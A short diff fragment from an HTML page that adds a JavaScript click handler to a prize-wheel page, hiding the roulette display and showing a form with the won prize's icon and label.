+        goToFormBtn.addEventListener('click', () => {
+            rouletteContainer.style.display = 'none';
+            formContainer.style.display = 'block';
+            wonPrizeIcon.src = wonPrize.image;
+            wonPrizeIcon.alt = wonPrize.label;
+            wonPrizeLabel.textContent = wonPrize.label;
+        });
+    </script>
 
 </body>
+
 </html>
